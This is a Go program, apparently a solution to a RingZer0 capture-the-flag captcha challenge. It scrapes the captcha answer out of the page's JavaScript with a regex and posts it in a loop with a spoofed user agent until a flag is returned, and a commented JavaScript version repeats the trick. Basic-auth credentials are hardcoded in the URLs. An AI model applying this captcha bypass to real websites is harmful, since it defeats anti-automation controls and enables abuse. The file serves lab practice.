package main

import (
	"fmt"
	"log"
	"regexp"

	"github.com/levigross/grequests"

	"./auth"
)

var answer = regexp.MustCompile(`if\s*\(\w\s*==\s*"([^"]+)`)
var haveRe = regexp.MustCompile(`have\s*(\d+)`)

func main() {
	needFlag := true

	sess, err := auth.NewSession()
	if err != nil {
		log.Fatalln(err)
	}
	var flag string
	var counter int
	for needFlag {
		formLink := "http://captcha:QJc9U6wxD4SFT0u@captcha.ringzer0team.com:7421/form1.php"
		res, err := sess.Session.Get(formLink, nil)
		if err != nil {
			log.Fatalln(err)
		}
		html := res.String()
		m := answer.FindStringSubmatch(html)
		a := m[1]

		postURL := "http://captcha:QJc9U6wxD4SFT0u@captcha.ringzer0team.com:7421/captcha1.php"
		data := map[string]string{"captcha": a}
		res, err = sess.Session.Post(postURL, &grequests.RequestOptions{
			Data:      data,
			Host:      "captcha.ringzer0team.com:7421",
			UserAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
		})
		if err != nil {
			log.Fatalln(err)
		}
		html = res.String()
		flag, err = auth.GetFlag(html)
		if err == nil {
			break
		} else {
			log.Println(html)
			m := haveRe.FindStringSubmatch(html)
			log.Println(m)
		}
		counter++
		log.Println(counter)

	}
	fmt.Println(flag)

}

// JS code
// function cap() {
//   var re = /if\s*\(\w\s*==\s*"([^"]+)/;
//   var myArray = re.exec(document.documentElement.innerHTML);
//   var answer = myArray[1];
//   var capinput = document.getElementsByName("captcha")[0];
//   capinput.value = answer;
//   document.getElementById("Form1").submit();
//   setTimeout(function() {
//     var links = document.getElementsByTagName("a");
//     links[1].click();
//   }, 5000)
// }
